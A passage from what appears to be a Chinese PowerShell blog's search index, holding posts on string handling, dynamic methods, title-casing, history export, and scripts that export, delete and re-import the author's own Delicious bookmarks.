012-3456-789","link":"/2013/11/01/processing-plain-text-with-powershell-3/"},{"title":"PowerShell 技能连载 - 替换文本中的指定字符","text":"如果您只是需要替换文本中字符出现的所有位置，这是很简单的。以下可以将文本中所有的“l”变为大写： &quot;Hello World&quot;.Replace('l', 'L') 然而有些时候，您需要替换特定位置的某几个字符。我们假设您的文本是一个比特掩码，并且您需要对某些比特置位或清除。以上代码是不能用的，因为它一口气改变了所有的位： PS&gt; &quot;110100011110110&quot;.Replace('1', '0') 000000000000000 而且您也不能通过索引来改变字符。您可以读取一个字符（例如检查某一个位是否为“1”），但您无法改变它的值： PS&gt; &quot;110100011110110&quot;[-1] -eq '1' False PS&gt; &quot;110100011110110&quot;[-2] -eq '1' True PS&gt; &quot;110100011110110&quot;[-2] = '0' 无法对 System.String 类型的对象进行索引。 要改变一个字符串中的某些字符，请将它转换为一个 StringBuilder： PS&gt; $sb = New-Object System.Text.StringBuilder(&quot;1101100011110110&quot;) PS&gt; $sb[-1] 0 PS&gt; $sb[-1] -eq '1' False PS&gt; $sb[-2] -eq '1' True PS&gt; $sb[-2] = '0' PS&gt; $sb[-2] -eq '1' False PS&gt; $sb.ToString() 110100011110100 以下是将二进制转换为十进制格式的方法： PS&gt; $sb.ToString() 110100011110100 PS&gt; [System.Convert]::ToInt64($sb.ToString(), 2) 26868","link":"/2013/11/01/replacing-specific-characters-in-a-text/"},{"title":"用 PowerShell 脚本将书签批量导入 Delicious","text":"前言美味书签是 Delicious 在线书签服务的中国本地化版本。由于各方面原因，美味书签实现的功能有限，远远达不到 Delicious 的功能。所以我希望将美味书签中的使用记录迁移回 Delicious。 经过一年使用，我在美味书签中已经积累了 5000+ 条书签记录。由于美味书签不支持书签导出功能，所以将美味书签中的书签导出至 Delicious 是一件需要动手动脑的事。幸好我们有 PowerShell 脚本，可以助我们完成这项单调枯燥的事。 这是一个系列文章，一共分为 3 部分： 用 PowerShell 脚本来导出美味书签 [用 PowerShell 脚本来清除 Delicious 账户下的所有书签][用 PowerShell 脚本来批量删除 Delicious 账户下的所有书签] 用 PowerShell 脚本将书签批量导入 Delicious 原理分析Delicious API通过阅读 Delicious API，可以知道我们只需要这样一条 API /v1/posts/add?，它的参数为： &amp;url={URL} (required) — The url of the item. &amp;description={...} (required) — The description of the item. &amp;extended={...} (optional) — Botes for the item. &amp;tags={...} (optional) — Tags for the item (comma delimited). &amp;dt={CCYY-MM-DDThh:mm:ssZ} (optional) — Datestamp of the item (format “CCYY-MM-DDThh:mm:ssZ”). Requires a LITERAL “T” and “Z” like in ISO8601 at http://www.cl.cam.ac.uk/~mgk25/iso-time.html for Example: 1984-09-01T14:21:31Z &amp;replace=no (optional) — Don’t replace post if given url has already been posted. &amp;shared=no (optional) — Make the item private 关于身份验证，请参考本系列的另一篇文章 用 PowerShell 脚本来清除 Delicious 账户下的所有书签 。 URL 编码我们需要提交的书签中，description 字段和 tags 字段是有可能出现 URL 中不允许的字符的，例如 ?、&amp;，以及中文字符等。我们需要将它们进行 URL 编码以后，才可以拼接到 URL 字符串中。在 PowerShell 中进行 URL 编码的方法如下： Add-Type -AssemblyName 'System.Web' [System.Web.HttpUtility]::UrlEncode('中文') 其中第一行是为了加载 System.Web 程序集。还可以用以下两种方法来实现： [void][system.Reflection.Assembly]::LoadWithPartialName(&quot;System.Web&quot;) 以及： [Reflection.Assembly]::LoadFile('C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\System.Web.dll') | Out-Null 生成查询字符串我们要在查询字符串中包含 API 文档中提到的那 7 个参数。用 string -f 的方式显得有点笨拙。于是我们编写这样一个函数： function Get-QueryString ($params) { $keyValuePairs = ($params.Keys | % { write ('{0}={1}' -f $_, $params[$_]) }) return $keyValuePairs -join '&amp;' } 这个函数接收一个哈希表作为参数，也可以是 [ordered] （即OrderedDictionary）。函数中循环地取出所有键，将它们的值用 &amp; 符号拼接在一起。 容错设计若是 Invoke-WebRequest 命令抛出异常，或是 HTTP 响应码不为 200，或是 XML 中不是 &lt;result code=&quot;done&quot; /&gt; 这样的返回，那么表示添加书签失败。我们可以把这些书签收集起来，输出到 failed_import.csv 文件中。然后下次可以再对这个文件进行导入。直到这个文件中没有记录为止。当然，您也可以将脚本改进一下，全自动地做完上述的事情。那么您一定是懒（勤劳）到家了 ;-) 源代码$userName = 'vichamp' $importFileName = 'meiweisq-export-20131030.csv' #$importFileName = 'failed_import.csv' Add-Type -AssemblyName 'System.Web' #$password = ConvertTo-SecureString –String &quot;xxx&quot; –AsPlainText -Force $credential = Get-Credential -UserName $userName -Message '请输入密码' function Get-QueryString ($params) { $keyValuePairs = ($params.Keys | % { write ('{0}={1}' -f $_, $params[$_]) }) return $keyValuePairs -join '&amp;' } $startTime = [datetime]::Now $template = 'https://api.del.icio.us/v1/posts/add?{0}' $bookmarks = Import-Csv $importFileName $failedBookmarks = @() $index = 0 $bookmarks | foreach { $params = @{} $params.Add('description', [System.Web.HttpUtility]::UrlEncode($_.Title)) if ($false) { $params.Add('extended', [System.Web.HttpUtility]::UrlEncode('')) } $params.Add('tags', [System.Web.HttpUtility]::UrlEncode([string]::Join(',', $_.Tags -split ', '))) $params.Add('dt', (&quot;{0}T00:00:00Z&quot; -f ($_.LinkTime -creplace '/', '-'))) $params.Add('replace', 'no') $params.Add('shared', 'yes') $params.Add('url', $_.Url) $queryString = Get-QueryString $params $url = $template -f $queryString $message = &quot;Bookmark: {0} / {1}, Elapsed: {2}&quot; -f @( $($index + 1), $bookmarks.Length, ([datetime]::Now - $startTime).ToString() ) Write-Progress -Activity 'Adding bookmarks' -PercentComplete (100 * $index / $bookmarks.Length) -CurrentOperation $message #echo &quot;Requesting $_.Url&quot; $isSuccess = $false try { [xml]$response = Invoke-WebRequest -Uri $url -Credential $credential $isSuccess = $response.StatusCode -eq 200 -and $response.result.code -eq 'done' } catch { } if ($isSuccess) { Write-Output &quot;[SUCC] $($_.Url)&quot; } else { Write-Warning &quot;[FAIL] $($_.Url)&quot; $failedBookmarks += $_ } $index++ } $failedBookmarks | Export-Csv 'failed_import.csv' -Encoding UTF8 -NoTypeInformation 您也可以点击这里下载源代码。","link":"/2013/11/01/use-powershell-to-batch-import-bookmarks-into-delicious/"},{"title":"用 PowerShell 脚本来清除您 Delicious 账户下的所有书签","text":"前言美味书签是 Delicious 在线书签服务的中国本地化版本。由于各方面原因，美味书签实现的功能有限，远远达不到 Delicious 的功能。所以我希望将美味书签中的使用记录迁移回 Delicious。 经过一年使用，我在美味书签中已经积累了 5000+ 条书签记录。由于美味书签不支持书签导出功能，所以将美味书签中的书签导出至 Delicious 是一件需要动手动脑的事。幸好我们有 PowerShell 脚本，可以助我们完成这项单调枯燥的事。 这是一个系列文章，一共分为 3 部分： 用 PowerShell 脚本来导出美味书签 [用 PowerShell 脚本来清除 Delicious 账户下的所有书签][用 PowerShell 脚本来批量删除 Delicious 账户下的所有书签] 用 PowerShell 脚本将书签批量导入 Delicious 原理分析Delicious API通过阅读 Delicious API，我们找出需要的 API 来： API 功能 /v1/posts/all? 列出所有书签 /v1/posts/all?hashes 以哈希的形式列出所有书签 /v1/posts/delete? 删除一条书签 其中 /v1/posts/all?hashes 这条 API 暂时用不到。 身份验证在 Delicious API 文档中提到了在 URL 中包含用户和密码的方式来验证身份： $ curl https://user:passwd@api.delicious.com/v1/posts/get?tag=webdev&amp;meta=yes 但在实际中这个方法行不通。我们还是通过 PowerShell 的 Get-Credential 命令来实现： $credential = Get-Credential -UserName $userName -Message '请输入密码' 这段代码的执行效果是弹出一个身份验证框 当然，您也可以把身份信息硬编码的方式写在脚本中，在调试期可以提高效率。但在脚本发布时，可以采用 Get-Credential 这种优雅的方式来提示用户输入。 调用 API调用 Delicious API 的方法十分简单，由于返回的是一个 XML 文档，我们可以显式地将 $listResponse 返回值的数据类型声明为 [xml]。 [xml]$listResponse = Invoke-WebRequest -Uri 'https://api.del.icio.us/v1/posts/all?red=api' -Credential $credential 解析执行结果我们可以在浏览器中试着敲入 https://api.delicious.com/v1/posts/all?red=api 来观察执行结果，浏览器将会要求您输入 Delicious 的用户名与密码： 通过观察 XML 的结构，我们可以从 API 响应中取得所有书签的链接，用 XPATH 表达为 posts/post/@href。用 PowerShell 来表达，代码如下： $links = $listResponse.posts.post | select -exp href -Unique 考虑到有些链接可能重复，我们加了个 -Unique 参数，取得不重复的唯一结果。 删除链接通过上述方法得到所有的书签链接之后，我们可以循环调用 /v1/posts/delete? API 来删除它们。根据文档，若删除成功，将返回： &lt;result code=&quot;done&quot; /&gt; 所以我们可以这样设计脚本： if ($response.result.code -eq 'done') { # } 吝啬地休眠API 文档中有一句严厉的警告，原文如下： Please wait at least one second between HTTP queries, or you are likely to get automatically throttled. If you are releasing a library to access the API, you must do this. 意思是说 HTTP 请求不能太频繁，至少要间隔 1 秒。但我觉得时间是珍贵的，如果每次 Start-Sleep -Seconds 1 的话，每一次加上网络传输时间，就不止 1 秒了。时间浪费在 sleep 上十分可惜，特别是在大量的循环中更是如此。我希望 sleep 的时间恰好是 1 秒。所以我设计了一个函数，计算当前时间与上一次 sleep 时的时间差。然后精确地 sleep 这个时间差值，一点也不多睡 ;-) function Invoke-StingySleep ($seconds) { if (!$lastSleepTime) { $lastSleepTime = Get-Date } $span = $lastSleepTime + (New-TimeSpan -Seconds 1) - (Get-Date) Start-Sleep -Milliseconds $span.TotalMilliseconds } 不过实际使用中，似乎 Delicious 的开发者比较仁慈。如果我把 Start-Sleep 这行去掉，服务器并没有因为我们连续不断地请求而把我们的程序给屏蔽掉。当然也有可能是我所在的地方网络延迟太大了。 容错技巧其实这个程序还有很多地方可以改进，例如每次调用删除 API 后判断服务器的 HTTP 响应是否正确，但可以不去改进它。理由是：既然我们的目的是删除所有的书签，那么如果有某一些漏网之鱼没有删掉，那么在下一轮循环中会被查询出来，重新删除。只要脚本工作得不离谱的话，一定能删到完为止。 源代码$userName = 'vichamp' Add-Type -AssemblyName 'System.Web' #$password = ConvertTo-SecureString –String &quot;xxx&quot; –AsPlainText -Force $credential = Get-Credential -UserName $userName -Message '请输入密码' function Invoke-StingySleep ($seconds) { if (!$lastSleepTime) { $lastSleepTime = Get-Date } $span = $lastSleepTime + (New-TimeSpan -Seconds 1) - (Get-Date) #Start-Sleep -Milliseconds $span.TotalMilliseconds } while ($true) { Invoke-StingySleep 1 [xml]$listResponse = Invoke-WebRequest -Uri 'https://api.delicious.com/v1/posts/all?red=api' -Credential $credential #[xml]$response = Invoke-WebRequest -Uri 'https://api.del.icio.us/v1/posts/all?hashes' -Credential $credential if (!$listResponse.posts.post) { break } $links = $listResponse.posts.post | select -exp href -Unique $links | foreach { $encodedLink = [System.Web.HttpUtility]::UrlEncode($_) Invoke-StingySleep 1 [xml]$response = Invoke-WebRequest -Uri &quot;https://api.delicious.com/v1/posts/delete?url=$encodedLink&quot; -Credential $credential if ($response.result.code -eq 'done') { Write-Output &quot;[$($response.result.code)] $_&quot; } else { Write-Warning &quot;[$($response.result.code)] $_&quot; } } } echo 'Done' 您也可以点击这里下载源代码。","link":"/2013/11/01/use-powershell-to-clear-all-bookmarks-in-your-delicious-account/"},{"title":"用 PowerShell 脚本来导出美味书签","text":"前言美味书签是 Delicious 在线书签服务的中国本地化版本。由于各方面原因，美味书签实现的功能有限，远远达不到 Delicious 的功能。所以我希望将美味书签中的使用记录迁移回 Delicious。 经过一年使用，我在美味书签中已经积累了 5000+ 条书签记录。由于美味书签不支持书签导出功能，所以将美味书签中的书签导出至 Delicious 是一件需要动手动脑的事。幸好我们有 PowerShell 脚本，可以助我们完成这项单调枯燥的事。 这是一个系列文章，一共分为 3 部分： 用 PowerShell 脚本来导出美味书签 用 PowerShell 脚本来清除 Delicious 账户下的所有书签 用 PowerShell 脚本将书签批量导入 Delicious 原理分析模拟美味书签的登录过程美味书签的登录页面地址为 http://meiweisq.com/login 。我们可以使用 Invoke-WebRequest 获取登录页面，同时把会话信息记录到 $rb 变量中。 相应的 PowerShell 代码如下： $response = Invoke-WebRequest -Uri $homeUrl -Method Default -SessionVariable rb -ContentType application/html 得到的响应中其中包含多个表单。通过查看网页源代码，我们可以确定 Action 为“/login”的那个表单是我们所要的： 相应的 PowerShell 代码为： $loginForm = ($response.Forms | where { $_.Action -eq '/login' })[0] 我们在 Chrome 浏览器中登录一下，通过“开发者工具”的“Network”选项卡查看提交的数据： 根据提交的数据，我们可以编写 PowerShell 代码来提交表单，模拟登录按钮的动作。注意传入会话变量 $rb，以在后续的过程中保持会话身份，否则下次提交又会提示需要登录： $loginForm.Fields['email'] = $email $loginForm.Fields['password'] = $password $loginForm.Fields['type'] = '登录' $loginForm.Fields['return-url'] = '/home' $loginForm.Fields['remember'] = 'off' $response = Invoke-WebRequest -Uri $loginAction -WebSession $rb -Method POST -Body $loginForm 取得书签总数在登录后的页面底部有“1 - 30 共 5126 个书签”的字样，其中 30 和 5126 两个数字是我们关心的。我们用正则表达式 1 - (\\d+) 共 (\\d+) 个书签 从整个网页中提取书签的总数量。在 PowerShell 使用正则表达式： $response.Content -cmatch '1 - (\\d+) 共 (\\d+) 个书签' $page1Count = $Matches[1] $totalCount = $Matches[2] echo &quot;1 - $page1Count 共 $totalCount 个书签&quot; 根据 $page1Count 和 $totalCount，就可以计算总页数了： $pageCount = [math]::Ceiling($totalCount / $bookmarksPerPage) 遍历每一页知道了总页数，自然想到用 for 循环来遍历它们。我们观察每一页的规律，发现页码是通过 URL 的 page 参数指定的。我们用 PowerShell 来拼接 URL 字符串： $uri = 'http://meiweisq.com/home?page=' + $page 对于每一页，继续用 Invoke-WebRequest 来获取它的内容： $response = Invoke-WebRequest -Uri $uri -Method Default -WebSession $rb 分析书签在每一页中，含有不超过 30 个书签，其中包含了书签的标题、URL、标签、时间等信息。 接下来是一些 DOM 的分析，需要一点耐心。我们先把它输出为 .html 文件，以便分析： $response.Content &gt; current_page.html 从 Chrome 的开发者工具中，可以观察到 DOM 的结构。和我们有关系的是 class 为 links、link、tags、tag这些元素。我们用 jQuery 的语法来表达它们，整理成一个表格如下： 选择器 含义 div.links 本页所有书签的集合 div.links &gt; div.link 一个书签 div.links &gt; div.link a.link-title 书签标题、URL div.links &gt; div.link a.link-time 时间 div.links &gt; div.link ul.tags &gt; tag 标签 请注意一下，在 Invoke-WebRequest 的结果（COM 对象）中做 DOM 查询，是有点慢的，不像 WEB 中的 jQuery 那么高效。在我们需要做一定的优化，以缩短大量的查询的总时间。我的优化原则如下： 能用 id 过滤的，不用 tag。 如果需要查询一个节点的子节点，则把前者保存到临时变量中，不要每次都从根对象（document）开始查询。 以下是 DOM 查询的相关代码： $html = $response.ParsedHtml $linksDiv = ($html.getElementsByTagName('div') | where { $_.classname -eq 'links' })[0] $linksDiv.getElementsByTagName('div') | where { $_.classname -cmatch '\\blink[\\s,$]' } $linkTitle = $div.getElementsByTagName('a') | where { $_.className -eq 'link-title' } $title = $linkTitle | select -exp innerText $url = $linkTitle | select -exp href $linkTime = $div.getElementsByTagName('p') | where { $_.className -eq 'link-time' } | select -exp innerText $ul = $div.getElementsByTagName('ul') | where { $_.className -cmatch '\\btags[\\s,$]' } $tags = $ul.getElementsByTagName('a') | where { $_.className -cmatch 'tag' } $tagNames = $tags | foreach { $_.getAttribute('tag') } Javascript 的时间转换美味书签的时间以 yyyy/MM/dd 的形式表达，而 Delicious 导入/导出文件的时间以 Javascript 格式表达。它们之间的转换方法是，前者减去1970年1月1日0时整的时间差，得到的总秒数，即得到其 Javascript 的格式表达。PowerShell 实现代码如下： $jsTime = ([datetime]::ParseExact($_.LinkTime, 'yyyy/MM/dd', $null) - [datetime]'1970-01-01').TotalSeconds 输出经过上面的步骤，我们已将所有的书签以 PSObject 的形式存放在 $bookmarks 数组中。现在可以随心所欲地将 $bookmarks 输出为我们所希望的格式了： 这是输出为 CSV 格式的代码： $bookmarks | Export-Csv (&quot;meiweisq-export-{0:yyyyMMdd}.csv&quot; -f [datetime]::Now) -Encoding UTF8 -NoTypeInformation 这是输出到 GUI 界面的代码： $bookmarks | Out-GridView 另外，我们可以导出为 Delicious 的专用格式。由于格式比较简单，我们就不用 ConvertTo-HTML 之类的函数了。 源代码$email = 'victorwoo@gmail.com' $password = 'xxx' $homeUrl = 'http://meiweisq.com/home' $loginAction = 'http://meiweisq.com/login' $bookmarksPerPage = 30 $countPerExport = 10 function Get-DeliciousHtml($bookmarks) { $pre = @&quot; &lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt; &lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt; &lt;!-- This is an automatically generated file. It will be read and overwritten. Do Not Edit! --&gt; &lt;TITLE&gt;Bookmarks&lt;/TITLE&gt; &lt;H1&gt;Bookmarks&lt;/H1&gt; &lt;DL&gt;&lt;p&gt; &quot;@ $post = @&quot; &lt;/DL&gt;&lt;p&gt; &quot;@ $bookmarkTemplate = @&quot; &lt;DT&gt;&lt;A HREF=&quot;{0}&quot; ADD_DATE=&quot;{1}&quot; PRIVATE=&quot;{2}&quot; TAGS=&quot;{3}&quot;&gt;{4}&lt;/A&gt; &lt;DD&gt;{5} &quot;@ $result = $pre $bookmarks | foreach { $jsTime = ([datetime]::ParseExact($_.LinkTime, 'yyyy/MM/dd', $null) - [datetime]'1970-01-01').TotalSeconds $tags = [string]::Join(',', $_.Tags -split ', ') $bookmarkString = $bookmarkTemplate -f $_.Url, $jsTime, 0, $tags, $_.Title, '' $result += $bookmarkString } $result += $post return $result } $startTime = [datetime]::Now echo 'Requesting home' $response = Invoke-WebRequest -Uri $homeUrl -Method Default -SessionVariable rb -ContentType application/html if ($response.StatusCode -ne 200) { Write-Warning &quot;[$response.StatusCode] $homeUrl&quot; return } $response.Content &gt; mwsq_login.html echo 'Logining' $loginForm = ($response.Forms | where { $_.Action -eq '/login' })[0] $loginForm.Fields['email'] = $email $loginForm.Fields['password'] = $password $loginForm.Fields['type'] = '登录' $loginForm.Fields['return-url'] = '/home' $loginForm.Fields['remember'] = 'off' $response = Invoke-WebRequest -Uri $loginAction -WebSession $rb -Method POST -Body $loginForm if ($response.StatusCode -ne 200) { Write-Warning &quot;[$response.StatusCode] $loginAction&quot; return } $response.Content &gt; mwsq_home.html if ($response.Content -cnotmatch '1 - (\\d+) 共 (\\d+) 个书签') { Write-Warning '找不到书签个数' return } $page1Count = $Matches[1] $totalCount = $Matches[2] echo &quot;1 - $page1Count 共 $totalCount 个书签&quot; $pageCount = [math]::Ceiling($totalCount / $bookmarksPerPage) echo &quot;共 $pageCount 页&quot; echo '' $bookmarks = @() for ($page = 1; $page -le $pageCount; $page++) { $uri = 'http://meiweisq.com/home?page=' + $page echo &quot;Requesting $uri&quot; $isSuccess = $false while (!$isSuccess) { try { $response = Invoke-WebRequest -Uri $uri -Method Default -WebSession $rb if ($response.StatusCode -ne 200) { Write-Warning &quot;[$response.StatusCode] $loginAction&quot; continue } $isSuccess = $true } catch { } } $response.Content &gt; current_page.html $html = $response.ParsedHtml $linksDiv = ($html.getElementsByTagName('div') | where { $_.classname -eq 'links' })[0] $linksDiv.getElementsByTagName('div') | where { $_.classname -cmatch '\\blink[\\s,$]' } | foreach { $message = &quot;Bookmark: {0} / {1}, Page: {2} / {3}, Elapsed: {4}&quot; -f @( $($bookmarks.Length + 1), $totalCount, $page $pageCount, ([datetime]::Now - $startTime).ToString() ) Write-Progress -Activity 'Getting bookmarks' -PercentComplete (100 * ($bookmarks.Length + 1) / $totalCount) -CurrentOperation $message echo &quot;$($bookmarks.Length + 1) of $totalCount&quot; $div = $_ $linkTitle = $div.getElementsByTagName('a') | where { $_.className -eq 'link-title' } $title = $linkTitle | select -exp innerText $title = $title.Trim() echo $title $url = $linkTitle | select -exp href echo $url $linkTime = $div.getElementsByTagName('p') | where { $_.className -eq 'link-time' } | select -exp innerText $linkTime = $linkTime.Trim() echo $linkTime $ul = $div.getElementsByTagName('ul') | where { $_.className -cmatch '\\btags[\\s,$]' } $tags = $ul.getElementsByTagName('a') | where { $_.className -cmatch 'tag' } $tagNames = $tags | foreach { $_.getAttribute('tag') } if ($tagNames -eq $null) { $tagNames = @() } echo &quot;[$([string]::Join(' | ', $tagNames))]&quot; echo '' $bookmark = [PSObject]@{ Title = $title Url = $url LinkTime = $linkTime Tags = [string]::Join(', ', $tagNames) } $bookmarks += New-Object -TypeName PSObject -Property $bookmark } } echo 'Exporting html thant you can import into del.icio.us' $index = 0 while ($index -lt $totalCount) { $currentCountInExport = [math]::Min($countPerExport, $totalCount - $index) $endIndex = $index + $currentCountInExport $deliciousHtml = Get-DeliciousHtml ($bookmarks | select -Skip $index -First $currentCountInExport) $deliciousHtml | sc -Encoding UTF8 (&quot;meiweisq-export-{0:yyyyMMdd}-{1}-{2}.html&quot; -f [datetime]::Now, $index, $endIndex) $index += $currentCountInExport } $deliciousHtml = Get-DeliciousHtml $bookmarks $deliciousHtml | sc -Encoding UTF8 (&quot;meiweisq-export-{0:yyyyMMdd}-all.html&quot; -f [datetime]::Now) echo 'Exporting CSV.' $bookmarks | Export-Csv (&quot;meiweisq-export-{0:yyyyMMdd}.csv&quot; -f [datetime]::Now) -Encoding UTF8 -NoTypeInformation echo 'Exporting GUI.' $bookmarks | Out-GridView echo 'All done.' 您也可以点击这里下载源代码。","link":"/2013/11/01/use-powershell-to-export-bookmarks-in-meiweisq/"},{"title":"PowerShell 技能连载 - PowerShell 4.0 中的动态参数","text":"在 PowerShell 中，您可以使用变量来指代属性名。这段示例脚本定义了四个 profile 的属性名，然后在一个循环中分别查询这些属性值： $list = 'AllUsersAllHosts','AllUsersCurrentHost','CurrentUserAllHosts','CurrentUserCurrentHost' foreach ($property in $list) { $profile.$property } 您也可以在一个管道中使用它： 'AllUsersAllHosts','AllUsersCurrentHost','CurrentUserAllHosts','CurrentUserCurrentHost' | ForEach-Object { $profile.$_ } 通过这种方式，您可以检查和返回 PowerShell 当前使用的所有 profile： 'AllUsersAllHosts','AllUsersCurrentHost','CurrentUserAllHosts','CurrentUserCurrentHost' | ForEach-Object { $profile.$_ } | Where-Object { Test-Path $_ } 类似地，您可以首先使用 Get-Member 来获取一个指定对象包含的所有属性。以下代码可以返回 PowerShell 的“PrivateData”对象中所有名字包含“color”的属性： $host.PrivateData | Get-Member -Name *color* | Select-Object -ExpandProperty Name 接下来，您可以用一行代码获取所有的颜色设置： $object = $host.PrivateData $object | Get-Member -Name *color* -MemberType *property | ForEach-Object { $PropertyName = $_.Name $PropertyValue = $object.$PropertyName &quot;$PropertyName = $PropertyValue&quot; } | Out-GridView","link":"/2013/11/04/dynamic-parameters-in-powershell-4-0/"},{"title":"PowerShell 技能连载 - PowerShell 4.0 中的动态方法","text":"从 PowerShell 4.0 开始，方法名可以是一个变量。以下是一个简单的例子： $method = 'ToUpper' 'Hello'.$method() 当您需要调用的方法须通过一段脚本计算得到的时候，这个特性十分有用。 function Convert-Text { param ( [Parameter(Mandatory)] $Text, [Switch]$ToUpper ) if ($ToUpper) { $method = 'ToUpper' } else { $method = 'ToLower' } $text.$method() } 以下是用户调用该函数的方法： PS&gt; Convert-Text 'Hello' hello PS&gt; Convert-Text 'Hello' -ToUpper HELLO 缺省情况下，该函数将文本转换为小写。当指定了开关参数 -ToUpper 时，函数将文本转换为大写。由于动态方法特性的支持，该函数不需要为此写两遍代码。 译者注：在旧版本的 PowerShell 中，您可以通过 .NET 方法（而不是脚本方法）中的反射来实现相同的目的。虽然它不那么整洁，但它能运行在 PowerShell 4.0 以下的环境： function Convert-Text { param ( [Parameter(Mandatory)] $Text, [Switch]$ToUpper ) if ($ToUpper) { $method = 'ToUpper' } else { $method = 'ToLower' } $methodInfo = $Text.GetType().GetMethod($method, [type[]]@()) $methodInfo.Invoke($Text, $null) }","link":"/2013/11/05/dynamic-methods-in-powershell-4/"},{"title":"用 PowerShell 处理纯文本 - 4","text":"命题QQ 群里的史瑞克朋友提出的一个命题： $txt=&quot;192.168.1 192.168.2 192.168.3 172.19.3 192.16.1 192.16.2 192.16.11 192.16.3 10.0.4 192.16.29 192.16.9 192.16.99 192.16.100&quot; 要求输出： 10.0.4 172.19.3 192.16.1-192.16.3 192.16.9 192.16.11 192.16.29 192.16.99-192.16.100 192.168.1-192.168.3 问题解析* 将各个 IP 段补充为三位的格式 * 按字符串排序 * 遍历每一行，按照以下规则处理： * 如果和上一行连续，则上一段可能没有结束，更新 `$endIP` * 如果和上一行不连续 * 若 `$startIP` 和 `$endIP` 相同，说明是单个 IP，将单个 IP 加入 $result * 若 `$startIP` 和 `$endIP` 不同，说明是一段 IP，将一段 IP 加入 $result * 更新 `$startIP` 和 `$endIP` * 最后一行需要特殊处理 PowerShell 实现$DebugPreference = &quot;Continue&quot; $txt=&quot;192.168.1 192.168.2 192.168.3 172.19.3 192.16.1 192.16.2 192.16.11 192.16.3 10.0.4 192.16.29 192.16.9 192.16.99 192.16.100&quot; $txt += &quot;`n999.999.999&quot; $startIP = @(0, 0, 0) $endIP = @(0, 0, 0) $result = @() -split $txt | % { $fullSegments = ($_ -split &quot;\\.&quot; | % { &quot;{0:D3}&quot; -f [int]$_ }) $fullSegments -join &quot;.&quot; } | sort | % { Write-Debug &quot;Processing $_&quot; $segments = @($_ -split &quot;\\.&quot; | % { [int]$_ }) if ($endIP[0] -eq $segments[0] -and $endIP[1] -eq $segments[1] -and $endIP[2] + 1 -eq $segments[2]) { Write-Debug '和上一个IP连续' $endIP = $segments } else { Write-Debug '和上一个IP不连续' if (($startIP -join &quot;.&quot;) -eq ($endIP -join &quot;.&quot;)) { Write-Debug '单个IP' $result += $startIP -join &quot;.&quot; } else { Write-Debug '一段IP' $result += ($startIP -join &quot;.&quot;) + &quot;-&quot; + ($endIP -join &quot;.&quot;) } $startIP = $segments $endIP = $segments } } $result | select -Skip 1 源代码请在这里下载。","link":"/2013/11/05/processing-plain-text-with-powershell-4/"},{"title":"PowerShell 技能连载 - 查找缺省的 Outlook 配置文件","text":"PowerShell 可以操作 COM 对象，例如 Outlook 应用程序。以下简单的两行代码能返回当前的 Outlook 配置文件名： $outlookApplication = New-Object -ComObject Outlook.Application $outlookApplication.Application.DefaultProfileName","link":"/2013/11/06/finding-default-outlook-profile/"},{"title":"PowerShell 技能连载 - 将单词首字母转换为大写","text":"要正确地将单词首字母转换为大写，您可以用正则表达式或者一点系统函数： 用正则表达式的话，您可以这样做： $sentence = 'here is some text where i would like the first letter to be capitalized.' $pattern = '\\b(\\w)' [RegEx]::Replace($sentence, $pattern, { param($x) $x.Value.ToUpper() }) 用系统函数的话，这样做可以达到相同的效果： $sentence = 'here is some text where i would like the first letter to be capitalized.' (Get-Culture).TextInfo.ToTitleCase($sentence) 正则表达式稍微复杂一点，但是功能更多。例如如果出于某种古怪的原因，您需要将每个单词的首字母替换为它的 ASCII 码，那么正则表达式可以轻松地实现： $sentence = 'here is some text where i would like the first letter to be capitalized.' $pattern = '\\b(\\w)' [RegEx]::Replace($sentence, $pattern, { param($x) [Byte][Char]$x.Value })","link":"/2013/11/07/capitalizing-words/"},{"title":"PowerShell 技能连载 - 导出和导入 PowerShell 历史","text":"PowerShell 保存了您键入的所有命令列表，但是当您关闭 PowerShell 时，这个列表就丢失了。 以下是一个保存当前命令历史到文件的单行代码： Get-History | Export-Clixml $env:temp\\myHistory.xml 当您启动一个新的 PowerShell 控制台或 ISE 编辑器实例时，您可以将保存的历史读入 PowerShell： Import-Clixml $env:\\temp\\myHistory.xml | Add-History 不过，加载历史并不会影响键盘缓冲区，所以按下上下键并不会显示新导入的历史条目。然而，您可以用 TAB 自动完成功能来查找您之前输入的命令： #(KEYWORD) &lt;-现在按下（TAB）键！","link":"/2013/11/08/exporting-and-importing-powershell-history/"},{"title":"PowerShell 技能连载 - 自动找借口的脚本","text":"译者注：您没有看错！这是近期最邪恶的一个技巧，文末有译者机器上的实验效果。 厌倦了每次自己想蹩脚的借口？以下脚本能让您每调用一次 Get-Excuse 就得到一个新的接口！您所需的一切只是 Internet 连接： function Get-Excuse { $url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl' $ProgressPreference = 'SilentlyContinue' $page = Invoke-WebRequest -Uri $url -UseBasicParsing $pattern = '&lt;br&gt;&lt;font size = &quot;\\+2&quot;&gt;(.+)' if ($page.Content -match $pattern) { $matches[1] } } 如果您需要通过代理服务器或者身份认证来访问 Internet，那么请查看函数中 Invoke-WebRequest 的参数。您可以通过它提交代理服务器信息，例如身份验证信息。 译者注：以下是 Get-Excuse 为笔者找的“借口”，很有创意吧 ;-) PS &gt;Get-Excuse your process is not ISO 9000 compliant PS &gt;Get-Excuse evil hackers from Serbia. PS &gt;Get-Excuse piezo-electric interference PS &gt;Get-Excuse Bogon emissions PS &gt;Get-Excuse because Bill Gates is a Jehovah's witness and so nothing can work on St. Swithin's day. PS &gt;Get-Excuse Your cat tried to eat the mouse. PS &gt;Get-Excuse It works the way the Wang did, what's the problem PS &gt;Get-Excuse Telecommunications is upgrading. PS &gt;Get-Excuse Your computer's union contract is set to expire at midnight. PS &gt;Get-Excuse Daemon escaped from pentagram PS &gt;Get-Excuse nesting roaches shorted out the ether cable PS &gt;Get-Excuse We ran out of dial tone and we're and waiting for the phone company to deliver another bottle. PS &gt;Get-Excuse Root nameservers are out of sync","link":"/2013/11/11/getting-excuses-automatically/"},{"title":"在 PowerShell 脚本中使用 C# 代码","text":"PowerShell 使我们拥有了一门非常强大的脚本语言。许多产品，例如 SharePoint 以 Cmdlet 的形式提供了它们自己的管理扩展。 客户们喜欢脚本语言，是因为它使他们能够编写自己的代码而不需要运行某个编译器，也不需要将可执行程序拷贝到它们的目标计算机中。相对于部署一个脚本，在那些目标计算机中运行一个可执行程序或者在命令行 Shell 